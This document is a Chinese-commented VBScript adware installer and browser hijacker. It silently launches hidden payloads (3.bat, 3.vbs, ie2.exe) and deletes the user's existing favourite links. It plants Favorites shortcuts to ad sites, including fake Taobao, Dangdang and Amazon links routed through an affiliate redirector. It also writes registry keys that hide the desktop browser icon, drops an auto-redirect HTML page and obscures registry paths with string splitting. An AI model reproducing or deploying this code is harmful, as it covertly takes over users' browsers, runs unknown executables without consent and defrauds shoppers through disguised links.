Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'特殊文件夹“桌面”
Favorites = WshShell.SpecialFolders("Favorites") :'特殊文件夹“桌面”

on error resume next 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\3.bat""",0

Rem 

Set oShellLink = WshShell.CreateShortcut(Favorites & "\高速直播77zb在线的体育.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://77"&"z"&"b.com/?fas" :'程数
oShellLink.IconLocation = "%ProgramFiles%\winsoft7\77"&"zb.ico, 0" : '图标
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oShellLink = WshShell.CreateShortcut(Favorites & "\高速极品极速的网络电视.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小
oShellLink.IconLocation = "%ProgramFiles%\winsoft7\9ptv.ico, 0" : '图标
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式

createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\3.vbs""",0
Rem
RegPath="HKEY_CURRENT_USER\Soft"&"ware\Micro"&"soft\Win"&"dows\Current"&"Version\Expl"&"orer\HideDesktop"&"Icons\NewStart"&"Panel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\最新精品绿色好的电影免费！.高清高速！天天更新!!!.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\最新在线小说免费的阅读站！丰富内容速度快的小说站!!!.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\人体绝色艺术站.-追求最美人体极品摄影写真!!.url")
oUrlLink.TargetPath = "http://www.003dh.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\淘"&"宝"&"网 - 淘！我喜欢.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575.com在线小游戏！，最好玩最新最快超级小游戏!!!.url")
oUrlLink.TargetPath = "http://www.45575.com/?sss"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\当当网—网上购物中心：图书、母婴、美妆、家居、数码、家电、服装、鞋包等，正品低价，货到付款.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\卓越亚马逊网上购物图书，手机，数码，家电，化妆品，钟表，首饰等在线销售.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\看看连续剧在线，最好绿色最新高速免费电视剧网站!!!.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\漂亮的美人图大合集!!!清纯极品美媚超级写真！！.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fav"
oUrlLink.Save

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\链接\*.url"), True


Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\◆ 淘 宝 网 ◆.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\小游戏在线.url")
oUrlLink.TargetPath = "http://www.45575.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\当当网.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\卓越网.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\看看电视剧.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\美媚极品图.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\高速最新电影.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\快感小说网.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\人体艺术.url")
oUrlLink.TargetPath = "http://www.003dh.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\网络电视直播.url")
oUrlLink.TargetPath = "http://www.9ptv.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\链接\网址大全.url")
oUrlLink.TargetPath = "http://www.dduu.com/?fa2"
oUrlLink.Save
'=========

set fso=createobject("scripting.filesystemobject")
'创文件，参数1为forreading，2为forwriting，8为appending
set file=fso.createtextfile( strttWinDir&"\Common Files\winie7.html",2,ture)
'写入文件内容，有三种方法：write(x)写入x个字符，writeline写入换行，writeblanklines(n)写入n个空行
file.writeline "<script>window.location.href='http://www.939dh.com/?366';</script><meta http-equiv=""refresh"" content=""0;url=http://www.939dh.com/?366"">"
set file=fso.opentextfile(strttWinDir&"\Common Files\winie7.html",1,ture)
'关闭"&"文件
file.close
createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\ie2.exe""",0

WSHShell.RegDelete "HKCR\InternetShortcut\IsShortcut"
wscript.quit

